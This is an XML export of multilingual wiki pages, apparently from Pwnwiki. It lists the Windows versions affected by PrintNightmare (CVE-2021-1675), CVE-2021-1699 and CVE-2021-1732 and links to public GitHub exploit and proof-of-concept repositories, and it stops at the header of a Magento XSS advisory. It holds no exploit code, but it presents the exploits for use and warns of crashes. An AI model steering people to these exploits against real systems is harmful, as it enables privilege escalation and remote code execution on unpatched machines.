    Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)
    Windows Server 2008 for 32-bit Systems Service Pack 2
    Windows Server, version 2004 (Server Core installation)
    Windows RT 8.1
    Windows 8.1 for x64-based systems
    Windows 8.1 for 32-bit systems
    Windows 7 for x64-based Systems Service Pack 1
    Windows 7 for 32-bit Systems Service Pack 1
    Windows 10 Version 1607 for x64-based Systems
    Windows 10 Version 1607 for 32-bit Systems
    Windows 10 for x64-based Systems
    Windows 10 for 32-bit Systems
    Windows Server, version 20H2 (Server Core Installation)
    Windows 10 Version 20H2 for ARM64-based Systems
    Windows 10 Version 20H2 for 32-bit Systems
    Windows 10 Version 20H2 for x64-based Systems
    Windows 10 Version 2004 for x64-based Systems
    Windows 10 Version 2004 for ARM64-based Systems
    Windows 10 Version 2004 for 32-bit Systems
    Windows 10 Version 21H1 for 32-bit Systems
    Windows 10 Version 21H1 for ARM64-based Systems
    Windows 10 Version 21H1 for x64-based Systems
    Windows 10 Version 1909 for ARM64-based Systems
    Windows 10 Version 1909 for x64-based Systems
    Windows 10 Version 1909 for 32-bit Systems
    Windows 10 Version 1809 for ARM64-based Systems
    Windows 10 Version 1809 for x64-based Systems
    Windows 10 Version 1809 for 32-bit Systems
&lt;/pre&gt;


==EXP==
&lt;translate&gt;
&lt;!--T:2--&gt;
該EXP可以本地權限提升&amp;遠程代碼執行
&lt;/translate&gt;
https://github.com/JustYoomoon/PrintNightmare</text>
      <sha1>oyk8p15xu296o4ctvno96ts8e3k3920</sha1>
    </revision>
    <revision>
      <id>6083</id>
      <parentid>6055</parentid>
      <timestamp>2021-06-30T14:31:34Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <origin>6083</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2241" sha1="fmyibjvbdgqmxf43e0c3dzpztheanq5" xml:space="preserve">&lt;languages /&gt;

&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
   Windows Server 2019 (Server Core installation)
    Windows Server 2019
    Windows Server 2016 (Server Core installation)
    Windows Server 2016
    Windows Server 2012 R2 (Server Core installation)
    Windows Server 2012 R2
    Windows Server 2012 (Server Core installation)
    Windows Server 2012
    Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
    Windows Server 2008 R2 for x64-based Systems Service Pack 1
    Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)
    Windows Server 2008 for x64-based Systems Service Pack 2
    Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)
    Windows Server 2008 for 32-bit Systems Service Pack 2
    Windows Server, version 2004 (Server Core installation)
    Windows RT 8.1
    Windows 8.1 for x64-based systems
    Windows 8.1 for 32-bit systems
    Windows 7 for x64-based Systems Service Pack 1
    Windows 7 for 32-bit Systems Service Pack 1
    Windows 10 Version 1607 for x64-based Systems
    Windows 10 Version 1607 for 32-bit Systems
    Windows 10 for x64-based Systems
    Windows 10 for 32-bit Systems
    Windows Server, version 20H2 (Server Core Installation)
    Windows 10 Version 20H2 for ARM64-based Systems
    Windows 10 Version 20H2 for 32-bit Systems
    Windows 10 Version 20H2 for x64-based Systems
    Windows 10 Version 2004 for x64-based Systems
    Windows 10 Version 2004 for ARM64-based Systems
    Windows 10 Version 2004 for 32-bit Systems
    Windows 10 Version 21H1 for 32-bit Systems
    Windows 10 Version 21H1 for ARM64-based Systems
    Windows 10 Version 21H1 for x64-based Systems
    Windows 10 Version 1909 for ARM64-based Systems
    Windows 10 Version 1909 for x64-based Systems
    Windows 10 Version 1909 for 32-bit Systems
    Windows 10 Version 1809 for ARM64-based Systems
    Windows 10 Version 1809 for x64-based Systems
    Windows 10 Version 1809 for 32-bit Systems
&lt;/pre&gt;


==EXP==
&lt;translate&gt;
&lt;!--T:2--&gt;
該EXP可以本地權限提升&amp;遠程代碼執行
&lt;/translate&gt;

https://github.com/JustYoomoon/PrintNightmare

https://github.com/cube0x0/CVE-2021-1675</text>
      <sha1>fmyibjvbdgqmxf43e0c3dzpztheanq5</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-1675 Windows Print Spooler遠程代碼執行漏洞/en</title>
    <ns>0</ns>
    <id>5297</id>
    <revision>
      <id>6067</id>
      <timestamp>2021-06-30T01:11:24Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Affected Versions=="</comment>
      <origin>6067</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2142" sha1="3hbcxo6vsx28u00jfg8wl5b7j6nc5pz" xml:space="preserve">&lt;languages /&gt;

==Affected Versions==
&lt;pre&gt;
   Windows Server 2019 (Server Core installation)
    Windows Server 2019
    Windows Server 2016 (Server Core installation)
    Windows Server 2016
    Windows Server 2012 R2 (Server Core installation)
    Windows Server 2012 R2
    Windows Server 2012 (Server Core installation)
    Windows Server 2012
    Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
    Windows Server 2008 R2 for x64-based Systems Service Pack 1
    Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)
    Windows Server 2008 for x64-based Systems Service Pack 2
    Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)
    Windows Server 2008 for 32-bit Systems Service Pack 2
    Windows Server, version 2004 (Server Core installation)
    Windows RT 8.1
    Windows 8.1 for x64-based systems
    Windows 8.1 for 32-bit systems
    Windows 7 for x64-based Systems Service Pack 1
    Windows 7 for 32-bit Systems Service Pack 1
    Windows 10 Version 1607 for x64-based Systems
    Windows 10 Version 1607 for 32-bit Systems
    Windows 10 for x64-based Systems
    Windows 10 for 32-bit Systems
    Windows Server, version 20H2 (Server Core Installation)
    Windows 10 Version 20H2 for ARM64-based Systems
    Windows 10 Version 20H2 for 32-bit Systems
    Windows 10 Version 20H2 for x64-based Systems
    Windows 10 Version 2004 for x64-based Systems
    Windows 10 Version 2004 for ARM64-based Systems
    Windows 10 Version 2004 for 32-bit Systems
    Windows 10 Version 21H1 for 32-bit Systems
    Windows 10 Version 21H1 for ARM64-based Systems
    Windows 10 Version 21H1 for x64-based Systems
    Windows 10 Version 1909 for ARM64-based Systems
    Windows 10 Version 1909 for x64-based Systems
    Windows 10 Version 1909 for 32-bit Systems
    Windows 10 Version 1809 for ARM64-based Systems
    Windows 10 Version 1809 for x64-based Systems
    Windows 10 Version 1809 for 32-bit Systems
&lt;/pre&gt;


==EXP==
The EXP can promote local privileges &amp; remote code execution
https://github.com/JustYoomoon/PrintNightmare</text>
      <sha1>3hbcxo6vsx28u00jfg8wl5b7j6nc5pz</sha1>
    </revision>
    <revision>
      <id>6085</id>
      <parentid>6067</parentid>
      <timestamp>2021-06-30T14:39:09Z</timestamp>
      <contributor>
        <username>FuzzyBot</username>
        <id>11</id>
      </contributor>
      <comment>Updating to match new version of source page</comment>
      <origin>6085</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2185" sha1="41dcc7r1hgkrcr17rsrzxfcoux05599" xml:space="preserve">&lt;languages /&gt;

==Affected Versions==
&lt;pre&gt;
   Windows Server 2019 (Server Core installation)
    Windows Server 2019
    Windows Server 2016 (Server Core installation)
    Windows Server 2016
    Windows Server 2012 R2 (Server Core installation)
    Windows Server 2012 R2
    Windows Server 2012 (Server Core installation)
    Windows Server 2012
    Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
    Windows Server 2008 R2 for x64-based Systems Service Pack 1
    Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)
    Windows Server 2008 for x64-based Systems Service Pack 2
    Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)
    Windows Server 2008 for 32-bit Systems Service Pack 2
    Windows Server, version 2004 (Server Core installation)
    Windows RT 8.1
    Windows 8.1 for x64-based systems
    Windows 8.1 for 32-bit systems
    Windows 7 for x64-based Systems Service Pack 1
    Windows 7 for 32-bit Systems Service Pack 1
    Windows 10 Version 1607 for x64-based Systems
    Windows 10 Version 1607 for 32-bit Systems
    Windows 10 for x64-based Systems
    Windows 10 for 32-bit Systems
    Windows Server, version 20H2 (Server Core Installation)
    Windows 10 Version 20H2 for ARM64-based Systems
    Windows 10 Version 20H2 for 32-bit Systems
    Windows 10 Version 20H2 for x64-based Systems
    Windows 10 Version 2004 for x64-based Systems
    Windows 10 Version 2004 for ARM64-based Systems
    Windows 10 Version 2004 for 32-bit Systems
    Windows 10 Version 21H1 for 32-bit Systems
    Windows 10 Version 21H1 for ARM64-based Systems
    Windows 10 Version 21H1 for x64-based Systems
    Windows 10 Version 1909 for ARM64-based Systems
    Windows 10 Version 1909 for x64-based Systems
    Windows 10 Version 1909 for 32-bit Systems
    Windows 10 Version 1809 for ARM64-based Systems
    Windows 10 Version 1809 for x64-based Systems
    Windows 10 Version 1809 for 32-bit Systems
&lt;/pre&gt;


==EXP==
The EXP can promote local privileges &amp; remote code execution

https://github.com/JustYoomoon/PrintNightmare

https://github.com/cube0x0/CVE-2021-1675</text>
      <sha1>41dcc7r1hgkrcr17rsrzxfcoux05599</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-1675 Windows Print Spooler遠程代碼執行漏洞/ru</title>
    <ns>0</ns>
    <id>5301</id>
    <revision>
      <id>6071</id>
      <timestamp>2021-06-30T01:18:14Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-1675 Windows Print Spooler уязвимость удаленного выполнения кода"</comment>
      <origin>6071</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2225" sha1="hu1enpvmby0go1uwufu4c30cypvendy" xml:space="preserve">&lt;languages /&gt;

==Затронутая версия==
&lt;pre&gt;
   Windows Server 2019 (Server Core installation)
    Windows Server 2019
    Windows Server 2016 (Server Core installation)
    Windows Server 2016
    Windows Server 2012 R2 (Server Core installation)
    Windows Server 2012 R2
    Windows Server 2012 (Server Core installation)
    Windows Server 2012
    Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
    Windows Server 2008 R2 for x64-based Systems Service Pack 1
    Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)
    Windows Server 2008 for x64-based Systems Service Pack 2
    Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)
    Windows Server 2008 for 32-bit Systems Service Pack 2
    Windows Server, version 2004 (Server Core installation)
    Windows RT 8.1
    Windows 8.1 for x64-based systems
    Windows 8.1 for 32-bit systems
    Windows 7 for x64-based Systems Service Pack 1
    Windows 7 for 32-bit Systems Service Pack 1
    Windows 10 Version 1607 for x64-based Systems
    Windows 10 Version 1607 for 32-bit Systems
    Windows 10 for x64-based Systems
    Windows 10 for 32-bit Systems
    Windows Server, version 20H2 (Server Core Installation)
    Windows 10 Version 20H2 for ARM64-based Systems
    Windows 10 Version 20H2 for 32-bit Systems
    Windows 10 Version 20H2 for x64-based Systems
    Windows 10 Version 2004 for x64-based Systems
    Windows 10 Version 2004 for ARM64-based Systems
    Windows 10 Version 2004 for 32-bit Systems
    Windows 10 Version 21H1 for 32-bit Systems
    Windows 10 Version 21H1 for ARM64-based Systems
    Windows 10 Version 21H1 for x64-based Systems
    Windows 10 Version 1909 for ARM64-based Systems
    Windows 10 Version 1909 for x64-based Systems
    Windows 10 Version 1909 for 32-bit Systems
    Windows 10 Version 1809 for ARM64-based Systems
    Windows 10 Version 1809 for x64-based Systems
    Windows 10 Version 1809 for 32-bit Systems
&lt;/pre&gt;


==EXP==
EXP может продвигать локальные привилегии и удаленное выполнение кода
https://github.com/JustYoomoon/PrintNightmare</text>
      <sha1>hu1enpvmby0go1uwufu4c30cypvendy</sha1>
    </revision>
    <revision>
      <id>6086</id>
      <parentid>6071</parentid>
      <timestamp>2021-06-30T14:42:14Z</timestamp>
      <contributor>
        <username>FuzzyBot</username>
        <id>11</id>
      </contributor>
      <comment>Updating to match new version of source page</comment>
      <origin>6086</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2268" sha1="8d22ucuhzwzpbcmxjl72sdag43vy4w5" xml:space="preserve">&lt;languages /&gt;

==Затронутая версия==
&lt;pre&gt;
   Windows Server 2019 (Server Core installation)
    Windows Server 2019
    Windows Server 2016 (Server Core installation)
    Windows Server 2016
    Windows Server 2012 R2 (Server Core installation)
    Windows Server 2012 R2
    Windows Server 2012 (Server Core installation)
    Windows Server 2012
    Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
    Windows Server 2008 R2 for x64-based Systems Service Pack 1
    Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)
    Windows Server 2008 for x64-based Systems Service Pack 2
    Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)
    Windows Server 2008 for 32-bit Systems Service Pack 2
    Windows Server, version 2004 (Server Core installation)
    Windows RT 8.1
    Windows 8.1 for x64-based systems
    Windows 8.1 for 32-bit systems
    Windows 7 for x64-based Systems Service Pack 1
    Windows 7 for 32-bit Systems Service Pack 1
    Windows 10 Version 1607 for x64-based Systems
    Windows 10 Version 1607 for 32-bit Systems
    Windows 10 for x64-based Systems
    Windows 10 for 32-bit Systems
    Windows Server, version 20H2 (Server Core Installation)
    Windows 10 Version 20H2 for ARM64-based Systems
    Windows 10 Version 20H2 for 32-bit Systems
    Windows 10 Version 20H2 for x64-based Systems
    Windows 10 Version 2004 for x64-based Systems
    Windows 10 Version 2004 for ARM64-based Systems
    Windows 10 Version 2004 for 32-bit Systems
    Windows 10 Version 21H1 for 32-bit Systems
    Windows 10 Version 21H1 for ARM64-based Systems
    Windows 10 Version 21H1 for x64-based Systems
    Windows 10 Version 1909 for ARM64-based Systems
    Windows 10 Version 1909 for x64-based Systems
    Windows 10 Version 1909 for 32-bit Systems
    Windows 10 Version 1809 for ARM64-based Systems
    Windows 10 Version 1809 for x64-based Systems
    Windows 10 Version 1809 for 32-bit Systems
&lt;/pre&gt;


==EXP==
EXP может продвигать локальные привилегии и удаленное выполнение кода

https://github.com/JustYoomoon/PrintNightmare

https://github.com/cube0x0/CVE-2021-1675</text>
      <sha1>8d22ucuhzwzpbcmxjl72sdag43vy4w5</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-1675 Windows Print Spooler遠程代碼執行漏洞/zh-cn</title>
    <ns>0</ns>
    <id>5292</id>
    <revision>
      <id>6061</id>
      <timestamp>2021-06-30T01:09:57Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-1675 Windows Print Spooler远程代码执行漏洞"</comment>
      <origin>6061</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2187" sha1="70j95qmrqc6kzet1430qyasnpngcitu" xml:space="preserve">&lt;languages /&gt;

==影响版本==
&lt;pre&gt;
   Windows Server 2019 (Server Core installation)
    Windows Server 2019
    Windows Server 2016 (Server Core installation)
    Windows Server 2016
    Windows Server 2012 R2 (Server Core installation)
    Windows Server 2012 R2
    Windows Server 2012 (Server Core installation)
    Windows Server 2012
    Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
    Windows Server 2008 R2 for x64-based Systems Service Pack 1
    Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)
    Windows Server 2008 for x64-based Systems Service Pack 2
    Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)
    Windows Server 2008 for 32-bit Systems Service Pack 2
    Windows Server, version 2004 (Server Core installation)
    Windows RT 8.1
    Windows 8.1 for x64-based systems
    Windows 8.1 for 32-bit systems
    Windows 7 for x64-based Systems Service Pack 1
    Windows 7 for 32-bit Systems Service Pack 1
    Windows 10 Version 1607 for x64-based Systems
    Windows 10 Version 1607 for 32-bit Systems
    Windows 10 for x64-based Systems
    Windows 10 for 32-bit Systems
    Windows Server, version 20H2 (Server Core Installation)
    Windows 10 Version 20H2 for ARM64-based Systems
    Windows 10 Version 20H2 for 32-bit Systems
    Windows 10 Version 20H2 for x64-based Systems
    Windows 10 Version 2004 for x64-based Systems
    Windows 10 Version 2004 for ARM64-based Systems
    Windows 10 Version 2004 for 32-bit Systems
    Windows 10 Version 21H1 for 32-bit Systems
    Windows 10 Version 21H1 for ARM64-based Systems
    Windows 10 Version 21H1 for x64-based Systems
    Windows 10 Version 1909 for ARM64-based Systems
    Windows 10 Version 1909 for x64-based Systems
    Windows 10 Version 1909 for 32-bit Systems
    Windows 10 Version 1809 for ARM64-based Systems
    Windows 10 Version 1809 for x64-based Systems
    Windows 10 Version 1809 for 32-bit Systems
&lt;/pre&gt;


==EXP==
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
該EXP可以本地權限提升&amp;遠程代碼執行
&lt;/div&gt;
https://github.com/JustYoomoon/PrintNightmare</text>
      <sha1>70j95qmrqc6kzet1430qyasnpngcitu</sha1>
    </revision>
    <revision>
      <id>6063</id>
      <parentid>6061</parentid>
      <timestamp>2021-06-30T01:10:42Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==影响版本=="</comment>
      <origin>6063</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2126" sha1="a31n4k7apk8oz7g59nte5mlpd3xoywe" xml:space="preserve">&lt;languages /&gt;

==影响版本==
&lt;pre&gt;
   Windows Server 2019 (Server Core installation)
    Windows Server 2019
    Windows Server 2016 (Server Core installation)
    Windows Server 2016
    Windows Server 2012 R2 (Server Core installation)
    Windows Server 2012 R2
    Windows Server 2012 (Server Core installation)
    Windows Server 2012
    Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
    Windows Server 2008 R2 for x64-based Systems Service Pack 1
    Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)
    Windows Server 2008 for x64-based Systems Service Pack 2
    Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)
    Windows Server 2008 for 32-bit Systems Service Pack 2
    Windows Server, version 2004 (Server Core installation)
    Windows RT 8.1
    Windows 8.1 for x64-based systems
    Windows 8.1 for 32-bit systems
    Windows 7 for x64-based Systems Service Pack 1
    Windows 7 for 32-bit Systems Service Pack 1
    Windows 10 Version 1607 for x64-based Systems
    Windows 10 Version 1607 for 32-bit Systems
    Windows 10 for x64-based Systems
    Windows 10 for 32-bit Systems
    Windows Server, version 20H2 (Server Core Installation)
    Windows 10 Version 20H2 for ARM64-based Systems
    Windows 10 Version 20H2 for 32-bit Systems
    Windows 10 Version 20H2 for x64-based Systems
    Windows 10 Version 2004 for x64-based Systems
    Windows 10 Version 2004 for ARM64-based Systems
    Windows 10 Version 2004 for 32-bit Systems
    Windows 10 Version 21H1 for 32-bit Systems
    Windows 10 Version 21H1 for ARM64-based Systems
    Windows 10 Version 21H1 for x64-based Systems
    Windows 10 Version 1909 for ARM64-based Systems
    Windows 10 Version 1909 for x64-based Systems
    Windows 10 Version 1909 for 32-bit Systems
    Windows 10 Version 1809 for ARM64-based Systems
    Windows 10 Version 1809 for x64-based Systems
    Windows 10 Version 1809 for 32-bit Systems
&lt;/pre&gt;


==EXP==
该EXP可以本地权限提升&amp;远程代码执行
https://github.com/JustYoomoon/PrintNightmare</text>
      <sha1>a31n4k7apk8oz7g59nte5mlpd3xoywe</sha1>
    </revision>
    <revision>
      <id>6084</id>
      <parentid>6063</parentid>
      <timestamp>2021-06-30T14:35:49Z</timestamp>
      <contributor>
        <username>FuzzyBot</username>
        <id>11</id>
      </contributor>
      <comment>Updating to match new version of source page</comment>
      <origin>6084</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2169" sha1="24zl77tzrar7sx2a9tzbkz90opfzwj5" xml:space="preserve">&lt;languages /&gt;

==影响版本==
&lt;pre&gt;
   Windows Server 2019 (Server Core installation)
    Windows Server 2019
    Windows Server 2016 (Server Core installation)
    Windows Server 2016
    Windows Server 2012 R2 (Server Core installation)
    Windows Server 2012 R2
    Windows Server 2012 (Server Core installation)
    Windows Server 2012
    Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
    Windows Server 2008 R2 for x64-based Systems Service Pack 1
    Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)
    Windows Server 2008 for x64-based Systems Service Pack 2
    Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)
    Windows Server 2008 for 32-bit Systems Service Pack 2
    Windows Server, version 2004 (Server Core installation)
    Windows RT 8.1
    Windows 8.1 for x64-based systems
    Windows 8.1 for 32-bit systems
    Windows 7 for x64-based Systems Service Pack 1
    Windows 7 for 32-bit Systems Service Pack 1
    Windows 10 Version 1607 for x64-based Systems
    Windows 10 Version 1607 for 32-bit Systems
    Windows 10 for x64-based Systems
    Windows 10 for 32-bit Systems
    Windows Server, version 20H2 (Server Core Installation)
    Windows 10 Version 20H2 for ARM64-based Systems
    Windows 10 Version 20H2 for 32-bit Systems
    Windows 10 Version 20H2 for x64-based Systems
    Windows 10 Version 2004 for x64-based Systems
    Windows 10 Version 2004 for ARM64-based Systems
    Windows 10 Version 2004 for 32-bit Systems
    Windows 10 Version 21H1 for 32-bit Systems
    Windows 10 Version 21H1 for ARM64-based Systems
    Windows 10 Version 21H1 for x64-based Systems
    Windows 10 Version 1909 for ARM64-based Systems
    Windows 10 Version 1909 for x64-based Systems
    Windows 10 Version 1909 for 32-bit Systems
    Windows 10 Version 1809 for ARM64-based Systems
    Windows 10 Version 1809 for x64-based Systems
    Windows 10 Version 1809 for 32-bit Systems
&lt;/pre&gt;


==EXP==
该EXP可以本地权限提升&amp;远程代码执行

https://github.com/JustYoomoon/PrintNightmare

https://github.com/cube0x0/CVE-2021-1675</text>
      <sha1>24zl77tzrar7sx2a9tzbkz90opfzwj5</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-1699 Windows (modem.sys)信息泄漏漏洞</title>
    <ns>0</ns>
    <id>650</id>
    <revision>
      <id>881</id>
      <timestamp>2021-04-01T13:47:51Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== https://github.com/waleedassar/CVE-2021-1699"</comment>
      <origin>881</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="52" sha1="ewv649pu1m5n6h80f0xmg0pgqtpbn1w" xml:space="preserve">==POC==
https://github.com/waleedassar/CVE-2021-1699</text>
      <sha1>ewv649pu1m5n6h80f0xmg0pgqtpbn1w</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-1732 Windows Win32k 本地提權漏洞</title>
    <ns>0</ns>
    <id>394</id>
    <revision>
      <id>577</id>
      <timestamp>2021-03-22T07:16:37Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages  /&gt;  &lt;translate&gt; ==漏洞影響== &lt;/translate&gt;  [[File:Xnip2021-03-22 15-12-28.jpg|500px]]  ==EXP== https://github.com/KaLendsi/CVE-2021-1732-Exploit  &lt;translate&gt; =..."</comment>
      <origin>577</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="305" sha1="pizsa0ety6z005h0sdcx62uywpdaudk" xml:space="preserve">&lt;languages  /&gt;

&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;

[[File:Xnip2021-03-22 15-12-28.jpg|500px]]

==EXP==
https://github.com/KaLendsi/CVE-2021-1732-Exploit

&lt;translate&gt;
====⚠️️警告====
有蓝屏概率，請謹慎使用。
&lt;/translate&gt;
==POC==
https://github.com/KaLendsi/CVE-2021-1732-Exploit</text>
      <sha1>pizsa0ety6z005h0sdcx62uywpdaudk</sha1>
    </revision>
    <revision>
      <id>578</id>
      <parentid>577</parentid>
      <timestamp>2021-03-22T07:17:00Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>578</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="327" sha1="jic0inyxj5xtk07vcl74l36z0s3vqxx" xml:space="preserve">&lt;languages  /&gt;

&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;

[[File:Xnip2021-03-22 15-12-28.jpg|500px]]

==EXP==
https://github.com/KaLendsi/CVE-2021-1732-Exploit

&lt;translate&gt;
====⚠️️警告==== &lt;!--T:2--&gt;
有蓝屏概率，請謹慎使用。
&lt;/translate&gt;
==POC==
https://github.com/KaLendsi/CVE-2021-1732-Exploit</text>
      <sha1>jic0inyxj5xtk07vcl74l36z0s3vqxx</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-1732 Windows Win32k 本地提權漏洞/ja</title>
    <ns>0</ns>
    <id>3854</id>
    <revision>
      <id>4465</id>
      <timestamp>2021-06-09T10:11:38Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-1732 Windows Win32k のローカル権限昇格の脆弱性"</comment>
      <origin>4465</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="319" sha1="6j0dzn4pdxmkjcku5e7bq0hhjvuo96i" xml:space="preserve">&lt;languages  /&gt;

==脆弱性への影響==

[[File:Xnip2021-03-22 15-12-28.jpg|500px]]

==EXP==
https://github.com/KaLendsi/CVE-2021-1732-Exploit

====⚠️️警告 ====
ブルースクリーンになる可能性がありますので、ご注意ください。
==POC==
https://github.com/KaLendsi/CVE-2021-1732-Exploit</text>
      <sha1>6j0dzn4pdxmkjcku5e7bq0hhjvuo96i</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-1732 Windows Win32k 本地提權漏洞/ko</title>
    <ns>0</ns>
    <id>3853</id>
    <revision>
      <id>4464</id>
      <timestamp>2021-06-09T10:11:18Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==== ⚠️️ 경고 ==== 블루 스크린이 나올 확률이 있으니주의해서 사용하세요."</comment>
      <origin>4464</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="303" sha1="75xox0ut9nvot8o2z88p6ino18k3wx1" xml:space="preserve">&lt;languages  /&gt;

== 취약점 영향 ==

[[File:Xnip2021-03-22 15-12-28.jpg|500px]]

==EXP==
https://github.com/KaLendsi/CVE-2021-1732-Exploit

==== ⚠️️ 경고 ====
블루 스크린이 나올 확률이 있으니주의해서 사용하세요.
==POC==
https://github.com/KaLendsi/CVE-2021-1732-Exploit</text>
      <sha1>75xox0ut9nvot8o2z88p6ino18k3wx1</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-1732 Windows Win32k 本地提權漏洞/ne</title>
    <ns>0</ns>
    <id>3858</id>
    <revision>
      <id>4469</id>
      <timestamp>2021-06-09T10:19:18Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== कमजोरी प्रभाव =="</comment>
      <origin>4469</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="475" sha1="41j8r9ijxc727pblbieb2fs48b1vc1b" xml:space="preserve">&lt;languages  /&gt;

== कमजोरी प्रभाव ==

[[File:Xnip2021-03-22 15-12-28.jpg|500px]]

==EXP==
https://github.com/KaLendsi/CVE-2021-1732-Exploit

==== ⚠️️ चेतावनी ====
त्यहाँ निलो स्क्रिनको सम्भावना छ, कृपया यसलाई सावधानीपूर्वक प्रयोग गर्नुहोस्।
==POC==
https://github.com/KaLendsi/CVE-2021-1732-Exploit</text>
      <sha1>41j8r9ijxc727pblbieb2fs48b1vc1b</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-1732 Windows Win32k 本地提權漏洞/zh-cn</title>
    <ns>0</ns>
    <id>5082</id>
    <revision>
      <id>5822</id>
      <timestamp>2021-06-24T02:17:28Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "====⚠️️警告==== 有蓝屏概率，请谨慎使用。"</comment>
      <origin>5822</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="255" sha1="j4es2hq57740q6mclruwbsi3pw19e8p" xml:space="preserve">&lt;languages  /&gt;

==漏洞影响==

[[File:Xnip2021-03-22 15-12-28.jpg|500px]]

==EXP==
https://github.com/KaLendsi/CVE-2021-1732-Exploit

====⚠️️警告====
有蓝屏概率，请谨慎使用。
==POC==
https://github.com/KaLendsi/CVE-2021-1732-Exploit</text>
      <sha1>j4es2hq57740q6mclruwbsi3pw19e8p</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-21029 Adobe Magento Commerce XSS漏洞</title>
    <ns>0</ns>
    <id>3131</id>
    <revision>
      <id>3634</id>
      <timestamp>2021-05-30T02:58:47Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; SEC Consult Vulnerability Lab Security Advisory &lt; 20210210-0 &gt; =======================================================================               title: Reflected Cro..."</comment>
      <origin>3634</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="6360" sha1="mb4g0zp7q3b8g9wxlnb5xz95kpr26nm" xml:space="preserve">&lt;pre&gt;
SEC Consult Vulnerability Lab Security Advisory &lt; 20210210-0 &gt;
=======================================================================
              title: Reflected Cross-Site Scripting (XSS)
            product: Adobe Magento Commerce
 vulnerable version: &lt; 2.4.2
      fixed version: 2.4.2
         CVE number: CVE-2021-21029
             impact: Medium
           homepage: https://magento.com/
              found: 2020-06-29
                 by: Natsasit Jirathammanuwat (Office Thailand)
                     SEC Consult Vulnerability Lab

